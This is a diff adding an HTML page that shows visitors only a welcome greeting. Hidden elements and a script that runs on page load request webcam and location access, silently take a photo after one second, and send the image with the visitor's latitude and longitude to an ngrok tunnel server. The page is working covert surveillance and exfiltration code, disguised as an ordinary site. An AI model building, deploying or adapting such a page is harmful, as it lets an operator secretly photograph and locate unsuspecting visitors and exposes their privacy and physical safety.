@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Background Photo Capture with Location</title>
+    <style>
+        /* Hide video and canvas elements */
+        #video, #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h2>Hello! Welcome to our site.</h2> <!-- This is the only visible message -->
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="320" height="240"></canvas>
+
+    <script>
+        async function captureImageWithLocation() {
+            try {
+                // Access the user's webcam (this will still show a permission prompt)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+
+                // Play the video stream in the video element (hidden from view)
+                video.srcObject = stream;
+
+                // Capture location using the Geolocation API
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        // Wait for the video metadata to load
+                        video.addEventListener('loadedmetadata', () => {
+                            // Capture the image after 1 second (or adjust this timing as needed)
+                            setTimeout(() => {
+                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                                // Convert the canvas content to a base64 encoded image
+                                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+                                // Send the image and location to the server
+                                sendImageToServer(imageData, latitude, longitude);
+
+                                // Stop the video stream after capturing the image
+                                stream.getTracks().forEach(track => track.stop());
+                            }, 1000);  // Capture image after 1 second
+                        });
+                    }, error => {
+                        console.error('Error getting location:', error);
+                    });
+                } else {
+                    console.error('Geolocation is not supported by this browser.');
+                }
+
+            } catch (error) {
+                console.error('Error accessing the webcam:', error);
+            }
+        }
+
+        function sendImageToServer(imageData, latitude, longitude) {
+            console.log('Sending image and location to the server...');
+            fetch('https://ca2a-2401-4900-51d5-b51f-64be-4130-21fd-ce46.ngrok-free.app/upload-image', {  // Replace with your ngrok URL
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ image: imageData, latitude: latitude, longitude: longitude })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`Server error: ${response.statusText}`);
+                }
+                return response.json();
+            })
+            .then(data => console.log('Image and location uploaded successfully:', data))
+            .catch(error => console.error('Error uploading image and location:', error));
+        }
+
+        // Automatically start capturing the image and location when the page is loaded
+        document.addEventListener("DOMContentLoaded", captureImageWithLocation);
+    </script>
+</body>
+</html>
